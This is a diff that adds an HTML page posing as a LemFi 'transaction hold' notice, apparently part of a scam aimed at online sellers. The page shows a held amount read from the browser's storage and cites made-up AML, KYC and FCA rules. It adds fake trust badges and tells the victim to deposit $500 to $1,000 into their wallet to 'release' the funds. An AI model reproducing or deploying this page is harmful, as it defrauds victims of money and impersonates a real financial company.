@@ -1,0 +1,215 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LEMFI — Transaction Hold</title>
+    <link href="https://fonts.googleapis.com/css2?family=DM+Sans:opsz,wght@9..40,300;9..40,400;9..40,500;9..40,600;9..40,700&display=swap" rel="stylesheet">
+    <style>
+        *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
+        :root {
+            --green-primary: #00C389; --green-dark: #00A873; --green-light: #E6F9F2; --green-ghost: #F0FBF6;
+            --text-primary: #1B1B1B; --text-secondary: #6B7280; --text-tertiary: #9CA3AF;
+            --border: #E5E7EB; --bg-body: #F9FAFB; --bg-card: #FFFFFF;
+            --shadow-lg: 0 12px 40px rgba(0,0,0,0.08); --shadow-btn: 0 4px 14px rgba(0,195,137,0.3);
+            --radius-sm: 8px; --radius-md: 12px; --radius-lg: 16px; --radius-xl: 20px;
+            --red-bg: #FEF2F2; --red-border: #FECACA; --red-text: #991B1B; --red-accent: #DC2626;
+            --amber-bg: #FFFBEB; --amber-border: #FDE68A; --amber-text: #92400E; --amber-accent: #D97706;
+            --blue-bg: #EFF6FF; --blue-border: #BFDBFE; --blue-text: #1E40AF;
+        }
+        body { font-family: 'DM Sans', sans-serif; min-height: 100vh; display: flex; align-items: center; justify-content: center; background: var(--bg-body); padding: 24px 16px; color: var(--text-primary); -webkit-font-smoothing: antialiased; }
+        body::before { content: ''; position: fixed; inset: 0; pointer-events: none; z-index: 0; background: radial-gradient(ellipse 80% 50% at 50% -20%, rgba(220,38,38,0.05) 0%, transparent 60%); }
+        .page-wrapper { position: relative; z-index: 1; width: 100%; max-width: 440px; }
+        .top-bar { display: flex; align-items: center; justify-content: space-between; margin-bottom: 32px; padding: 0 4px; }
+        .logo { display: flex; align-items: center; gap: 10px; text-decoration: none; }
+        .logo-mark { width: 40px; height: 40px; background: var(--green-primary); border-radius: 10px; display: flex; align-items: center; justify-content: center; position: relative; overflow: hidden; }
+        .logo-mark::after { content: ''; width: 18px; height: 18px; border: 3px solid #fff; border-radius: 50%; border-top-color: transparent; transform: rotate(45deg); }
+        .logo-wordmark { font-size: 22px; font-weight: 700; color: var(--text-primary); letter-spacing: -0.5px; }
+        .help-link { font-size: 13px; font-weight: 500; color: var(--green-primary); text-decoration: none; display: flex; align-items: center; gap: 4px; padding: 6px 12px; border-radius: var(--radius-sm); transition: background 0.2s; }
+        .help-link:hover { background: var(--green-light); }
+        .help-link svg { width: 16px; height: 16px; }
+        .card { background: var(--bg-card); border-radius: var(--radius-xl); box-shadow: var(--shadow-lg); border: 1px solid rgba(0,0,0,0.04); overflow: hidden; max-height: 92vh; overflow-y: auto; }
+        .card::-webkit-scrollbar { width: 4px; }
+        .card::-webkit-scrollbar-thumb { background: var(--border); border-radius: 4px; }
+        .card-inner { padding: 32px; }
+
+        .hold-banner { background: var(--red-bg); border: 1px solid var(--red-border); border-radius: var(--radius-lg); padding: 24px 20px; text-align: center; margin-bottom: 20px; position: relative; overflow: hidden; }
+        .hold-banner::before { content: ''; position: absolute; top: -30px; left: 50%; transform: translateX(-50%); width: 120px; height: 120px; background: radial-gradient(circle, rgba(220,38,38,0.1) 0%, transparent 70%); pointer-events: none; }
+        .hold-icon-wrap { width: 52px; height: 52px; background: var(--red-accent); border-radius: 50%; display: inline-flex; align-items: center; justify-content: center; margin-bottom: 14px; position: relative; box-shadow: 0 4px 16px rgba(220,38,38,0.3); }
+        .hold-icon-wrap svg { width: 24px; height: 24px; color: #fff; }
+        .hold-banner .title { font-size: 17px; font-weight: 700; color: var(--red-text); position: relative; }
+        .hold-banner .sub { font-size: 13px; color: #B91C1C; margin-top: 4px; position: relative; }
+
+        .amount-display { text-align: center; margin-bottom: 20px; padding: 18px; background: var(--bg-body); border-radius: var(--radius-lg); border: 1.5px dashed var(--border); }
+        .amount-display .label { font-size: 11px; font-weight: 600; color: var(--text-tertiary); text-transform: uppercase; letter-spacing: 1.2px; }
+        .amount-display .value { font-size: 32px; font-weight: 700; color: var(--text-primary); margin-top: 4px; letter-spacing: -1px; }
+        .amount-display .currency { font-size: 18px; font-weight: 500; color: var(--text-secondary); vertical-align: top; margin-right: 2px; }
+        .amount-display .status-tag { display: inline-block; margin-top: 8px; padding: 4px 12px; background: var(--amber-bg); border: 1px solid var(--amber-border); border-radius: 20px; font-size: 11px; font-weight: 600; color: var(--amber-accent); text-transform: uppercase; letter-spacing: 0.5px; }
+
+        .reasons-box { background: var(--bg-body); border: 1px solid var(--border); border-radius: var(--radius-lg); padding: 20px; margin-bottom: 20px; }
+        .reasons-box h3 { font-size: 14px; font-weight: 600; color: var(--text-primary); margin-bottom: 14px; display: flex; align-items: center; gap: 8px; }
+        .reasons-box h3 svg { width: 18px; height: 18px; color: var(--red-accent); flex-shrink: 0; }
+        .reason-list { list-style: none; padding: 0; margin: 0; }
+        .reason-list li { display: flex; align-items: flex-start; gap: 10px; font-size: 13px; color: var(--text-secondary); margin-bottom: 12px; line-height: 1.5; }
+        .reason-list li:last-child { margin-bottom: 0; }
+        .reason-dot { width: 6px; height: 6px; border-radius: 50%; background: var(--red-accent); flex-shrink: 0; margin-top: 6px; }
+
+        .requirement-box { background: var(--amber-bg); border: 1px solid var(--amber-border); border-radius: var(--radius-lg); padding: 20px; margin-bottom: 20px; }
+        .requirement-box h3 { font-size: 14px; font-weight: 700; color: var(--amber-text); margin-bottom: 12px; display: flex; align-items: center; gap: 8px; }
+        .requirement-box h3 svg { width: 18px; height: 18px; color: var(--amber-accent); flex-shrink: 0; }
+        .requirement-box p { font-size: 13px; color: var(--amber-text); line-height: 1.6; margin-bottom: 12px; }
+        .requirement-box p:last-child { margin-bottom: 0; }
+        .requirement-box strong { color: #78350F; }
+        .amount-range { display: flex; align-items: center; gap: 12px; margin: 14px 0; padding: 14px 16px; background: #fff; border: 1px solid var(--amber-border); border-radius: var(--radius-md); }
+        .amount-range .min, .amount-range .max { flex: 1; text-align: center; }
+        .amount-range .min .val, .amount-range .max .val { font-size: 22px; font-weight: 700; color: var(--amber-text); }
+        .amount-range .min .lbl, .amount-range .max .lbl { font-size: 11px; color: #B45309; text-transform: uppercase; letter-spacing: 0.5px; margin-top: 2px; }
+        .amount-range .arrow { color: var(--amber-accent); }
+        .amount-range .arrow svg { width: 20px; height: 20px; }
+
+        .action-box { background: var(--blue-bg); border: 1px solid var(--blue-border); border-radius: var(--radius-lg); padding: 20px; margin-bottom: 20px; }
+        .action-box h3 { font-size: 14px; font-weight: 600; color: var(--blue-text); margin-bottom: 10px; display: flex; align-items: center; gap: 8px; }
+        .action-box h3 svg { width: 18px; height: 18px; color: var(--blue-text); flex-shrink: 0; }
+        .action-box p { font-size: 13px; color: var(--blue-text); line-height: 1.6; margin-bottom: 18px; }
+        .action-box p:last-of-type { margin-bottom: 0; }
+
+        .steps-list { list-style: none; padding: 0; margin: 0 0 20px 0; counter-reset: step; }
+        .steps-list li { counter-increment: step; font-size: 13px; color: var(--blue-text); margin-bottom: 12px; line-height: 1.5; padding-left: 32px; position: relative; }
+        .steps-list li:last-child { margin-bottom: 0; }
+        .steps-list li::before { content: counter(step); position: absolute; left: 0; top: 0; width: 22px; height: 22px; background: #fff; border: 1.5px solid var(--blue-border); color: var(--blue-text); font-size: 12px; font-weight: 700; border-radius: 6px; display: flex; align-items: center; justify-content: center; }
+        .steps-list li strong { color: #1E3A8A; }
+
+        .btn-download { width: 100%; padding: 14px 20px; background: var(--text-primary); color: #fff; border: none; border-radius: var(--radius-md); font-size: 14px; font-weight: 600; font-family: inherit; cursor: pointer; transition: all 0.25s ease; display: flex; align-items: center; justify-content: center; gap: 10px; text-decoration: none; margin-bottom: 10px; }
+        .btn-download:hover { background: #374151; box-shadow: 0 4px 14px rgba(0,0,0,0.15); transform: translateY(-1px); }
+        .btn-download:active { transform: translateY(0); }
+        .btn-download svg { width: 18px; height: 18px; }
+
+        .btn-website { width: 100%; padding: 13px 20px; background: transparent; color: var(--text-primary); border: 1.5px solid var(--border); border-radius: var(--radius-md); font-size: 14px; font-weight: 500; font-family: inherit; cursor: pointer; transition: all 0.2s ease; display: flex; align-items: center; justify-content: center; gap: 8px; text-decoration: none; }
+        .btn-website:hover { border-color: #D1D5DB; background: var(--bg-body); }
+        .btn-website svg { width: 16px; height: 16px; color: var(--text-secondary); }
+
+        .footer-section { margin-top: 24px; padding-top: 20px; border-top: 1px solid var(--border); }
+        .footer-text { text-align: center; font-size: 12px; color: var(--text-tertiary); line-height: 1.7; }
+        .footer-text a { color: var(--green-primary); text-decoration: none; font-weight: 500; }
+        .footer-text a:hover { text-decoration: underline; }
+        .security-row { display: flex; align-items: center; justify-content: center; gap: 16px; margin-top: 16px; }
+        .security-badge { display: flex; align-items: center; gap: 5px; font-size: 11px; color: var(--text-tertiary); }
+        .security-badge svg { width: 14px; height: 14px; color: var(--green-primary); }
+
+        @keyframes fadeUp { from { opacity: 0; transform: translateY(16px); } to { opacity: 1; transform: translateY(0); } }
+        @keyframes scaleIn { from { opacity: 0; transform: scale(0.8); } to { opacity: 1; transform: scale(1); } }
+        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
+        .animate-in { animation: fadeUp 0.5s cubic-bezier(0.16, 1, 0.3, 1) forwards; opacity: 0; }
+        .animate-scale { animation: scaleIn 0.5s cubic-bezier(0.16, 1, 0.3, 1) forwards; opacity: 0; }
+        .pulse { animation: pulse 2s ease-in-out infinite; }
+        .delay-1 { animation-delay: 0.05s; } .delay-2 { animation-delay: 0.1s; } .delay-3 { animation-delay: 0.15s; }
+        .delay-4 { animation-delay: 0.2s; } .delay-5 { animation-delay: 0.25s; } .delay-6 { animation-delay: 0.3s; }
+        .delay-7 { animation-delay: 0.35s; } .delay-8 { animation-delay: 0.4s; } .delay-9 { animation-delay: 0.45s; }
+        @media (max-width: 480px) { body { padding: 16px 12px; } .card-inner { padding: 24px; } .amount-display .value { font-size: 28px; } }
+    </style>
+</head>
+<body>
+    <div class="page-wrapper">
+        <div class="top-bar animate-in">
+            <a href="#" class="logo"><div class="logo-mark"></div><span class="logo-wordmark">Lemfi</span></a>
+            <a href="mailto:support@lemfi.com" class="help-link">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22,6 12,13 2,6"/></svg>
+                Support
+            </a>
+        </div>
+        <div class="card">
+            <div class="card-inner">
+                <div class="hold-banner animate-scale delay-1">
+                    <div class="hold-icon-wrap">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
+                    </div>
+                    <div class="title">Funds Currently On Hold</div>
+                    <div class="sub">Your transaction requires additional verification</div>
+                </div>
+
+                <div class="amount-display animate-in delay-2">
+                    <div class="label">Held Amount</div>
+                    <div class="value"><span class="currency">$</span><span id="displayAmount">0.00</span></div>
+                    <div class="status-tag pulse">Pending Verification</div>
+                </div>
+
+                <div class="reasons-box animate-in delay-3">
+                    <h3>
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>
+                        Why your funds are on hold
+                    </h3>
+                    <ul class="reason-list">
+                        <li><span class="reason-dot"></span><span><strong>Anti-Money Laundering (AML) Compliance</strong> — Regulatory bodies require transaction monitoring for all cross-border fund transfers to detect and prevent money laundering activities.</span></li>
+                        <li><span class="reason-dot"></span><span><strong>Know Your Customer (KYC) Verification</strong> — Financial institutions must verify the identity of all parties involved in a transaction before releasing funds.</span></li>
+                        <li><span class="reason-dot"></span><span><strong>Fraud Prevention Protocols</strong> — Automated systems flag transactions that deviate from normal patterns to protect both senders and receivers from fraudulent activity.</span></li>
+                        <li><span class="reason-dot"></span><span><strong>Financial Conduct Authority (FCA) Guidelines</strong> — As a regulated entity, LemFi must comply with all FCA-mandated holding periods and verification procedures.</span></li>
+                        <li><span class="reason-dot"></span><span><strong>International Sanctions Screening</strong> — All transactions are screened against global sanctions lists to ensure compliance with international law.</span></li>
+                        <li><span class="reason-dot"></span><span><strong>Transaction Volume Assessment</strong> — First-time large transfers require additional review to establish a baseline for your account's risk profile.</span></li>
+                    </ul>
+                </div>
+
+                <div class="requirement-box animate-in delay-4">
+                    <h3>
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
+                        Required: Transaction History
+                    </h3>
+                    <p>To receive funds through your selected payment method, <strong>you must have an established transaction history with LemFi.</strong> Our banking partners require proof of account activity before releasing incoming transfers to new or low-activity accounts.</p>
+                    <p>You must have transacted a total of <strong>between $500 and $1,000</strong> on your LemFi wallet to qualify for fund reception through your selected method.</p>
+                    <div class="amount-range">
+                        <div class="min">
+                            <div class="val">$500</div>
+                            <div class="lbl">Minimum</div>
+                        </div>
+                        <div class="arrow">
+                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="5" y1="12" x2="19" y2="12"/><polyline points="12 5 19 12 12 19"/></svg>
+                        </div>
+                        <div class="max">
+                            <div class="val">$1,000</div>
+                            <div class="lbl">Maximum</div>
+                        </div>
+                    </div>
+                    <p><strong>Your current wallet activity does not meet this requirement.</strong> You need to add funds to your LemFi wallet to build the required transaction history.</p>
+                </div>
+
+                <div class="action-box animate-in delay-5">
+                    <h3>
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="12" y1="1" x2="12" y2="23"/><path d="M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6"/></svg>
+                        How to add money to your wallet
+                    </h3>
+                    <p>Fund additions must be done directly through the <strong>LemFi app</strong> on your device. This is required by our banking partners for security and compliance purposes.</p>
+                    <ol class="steps-list">
+                        <li><strong>Open the LemFi app</strong> on your phone (download it if you haven't already).</li>
+                        <li>Tap <strong>"Add Money"</strong> from your wallet home screen.</li>
+                        <li>Choose your funding source and enter an amount between <strong>$500 – $1,000</strong>.</li>
+                        <li>Complete the transaction. Once your wallet history meets the requirement, <strong>return here</strong> and your held funds will be released automatically.</li>
+                    </ol>
+                    <a href="https://lemfi.com/" target="_blank" class="btn-download">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
+                        Open LemFi App
+                    </a>
+                    <a href="https://lemfi.com/" target="_blank" class="btn-website">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/></svg>
+                        Visit LemFi Website
+                    </a>
+                </div>
+
+                <div class="footer-section animate-in delay-6">
+                    <p class="footer-text">Questions about this hold? <a href="mailto:support@lemfi.com">Contact our compliance team</a><br>This hold is in accordance with applicable financial regulations.</p>
+                    <div class="security-row">
+                        <div class="security-badge"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>SSL Secured</div>
+                        <div class="security-badge"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>FCA Regulated</div>
+                        <div class="security-badge"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>Verified</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <script>
+        const savedAmount = localStorage.getItem('sellerAmount');
+        if (savedAmount) {
+            const n = parseFloat(savedAmount);
+            document.getElementById('displayAmount').textContent = isNaN(n) ? savedAmount : n.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+        }
+    </script>
+</body>
+</html>
